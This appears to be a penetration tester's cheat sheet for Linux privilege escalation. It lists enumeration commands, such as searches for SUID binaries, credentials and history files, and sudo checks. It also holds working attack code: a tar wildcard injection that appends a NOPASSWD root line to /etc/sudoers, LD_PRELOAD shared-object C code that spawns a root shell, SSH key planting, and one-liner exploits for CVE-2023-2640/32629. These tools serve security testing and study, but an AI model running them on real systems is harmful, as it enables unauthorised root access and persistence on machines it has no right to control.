---
title: Linux Privilege Escalation
---

# Linux Privilege Escalation
## Enum tools
- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [pspy](https://github.com/DominicBreuker/pspy)
- [Lin Enum](https://github.com/rebootuser/LinEnum)
- [RustScan](https://github.com/RustScan/RustScan)

## Resources
- [gtfobins](https://gtfobins.github.io/gtfobins/ssh/)
- [hacktricks (linux)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses)
- [hacktricks (windows)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Enum Basics
### Current logged user
```bash
whoami
```

### Current user groups
```bash
id
```

### Machine's domain name                                 
```bash
hostname
```

### OS version
```bash
cat /etc/os-release
```

### Kernel version
```bash
uname -a
```
```bash
cat /proc/version
```

### Sudo version
```bash
sudo -V
```

### Additional host info
```bash
lscpu
```

### Network interfaces
```bash
ifconfig
```
```bash
ip addr
```

### Routing table
```bash
netstat -rn
```
```bash
route
```

### Hostfile
```bash
cat /etc/hosts
```

### Arp table (other hosts)
```bash
arp -a
```

### Drives and shares
```bash
lkblk
```

### Mounts
```bash
cat /etc/fstab
```

### Mounted file systems
```bash
df -h
```

### Unmounted file systems
```bash
cat /etc/fstab | grep -v "#" | column -t
```

### What can we run as root?
```bash
sudo -l
```

### Is path misconfigured?
```bash
echo $PATH
```

### Environment variables
```bash
env
```

### Available shells
```bash
cat /etc/shells
```

### Existing users
```bash
cat /etc/passwd
```

### Existing groups
```bash
cat /etc/group
```

### Which users are in the sudo group?
```bash
getent group sudo
```

### Logged users
```bash
w
```

### Last user logins
```bash
lastlog
```

### Check bash history
```bash
history
```

### Cron
```bash
crontab -e
```
```bash
ls -la /etc/cron.daily/
```
### Root processes
```bash
ps aux | grep root
```

### Find .sh files
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

### Find .bash_history files
```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

### Find configuration files
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

### Find all writable files
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Find all hidden files for user
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep $USER
```

### Find SUID root executables
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

### Find SGID root executables
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

### Find temporary files
```bash
ls -l /tmp /var/tmp /dev/shm
```

### Find all writable directories
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

### Find all hidden directories
```bash
find / -type d -name ".*" -ls 2>/dev/null
```

### Installed packages
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

## Things to look for
- Commands that contain credentials like `mysql -ptest123` get leaked in `ps`, use `pspy`
- Search for hashes/credentials, often in backups or configs

## Misc notes

### tar extract wildcard abuse
File names can be treated as arguments if `tar` is called with `*` like `tar -zcf /home/someone/something.tar.gz *`
```bash
echo 'echo "my-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > exp.sh
echo "" > "--checkpoint-action=exec=sh exp.sh"
echo "" > --checkpoint=1
```

### .so loading
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
    system("/bin/bash -i");
}
```

```bash
gcc -fPIC -shared -o extension.so extension.c -nostartfiles
```

```bash
bash -p
```

### ssh private key

```bash
# victim
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# Host
## copy key to host
chmod 600 /path/to/id_rsa_custom
ssh -i /path/to/id_rsa_custom user@target_machine_ip
```

## CVEs

### CVE-2023-2640 | CVE-2023-32629

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
# Or
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
```
